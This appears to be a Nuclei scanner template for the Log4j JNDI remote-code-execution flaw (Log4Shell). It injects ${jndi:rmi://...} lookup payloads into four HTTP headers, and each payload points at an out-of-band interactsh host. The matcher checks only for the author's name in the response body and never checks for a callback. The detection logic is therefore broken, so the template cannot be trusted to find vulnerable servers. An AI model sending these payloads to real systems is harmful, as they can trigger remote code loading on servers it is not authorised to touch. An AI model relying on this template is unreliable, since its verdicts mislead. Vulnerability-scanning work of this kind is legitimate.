id: jndi-log4j

info:
  name: jndi log4j RCE
  author: Omkar7505
  severity: critical
  tags: rce

requests:
- raw:
  - |+
    GET / HTTP/1.1
    Host: {{Hostname}}
    User-agent: ${jndi:rmi://{{Hostname}}.{{interactsh-url}}/a}
    X-Forwarded-For: ${jndi:rmi://{{Hostname}}.{{interactsh-url}}/a}
    Referer: ${jndi:rmi://{{Hostname}}.{{interactsh-url}}/a}
    X-Api-Version: ${jndi:rmi://{{Hostname}}.{{interactsh-url}}/a}

  matchers:
  - type: word
    part: body
    words:
      - "Omkar7505"
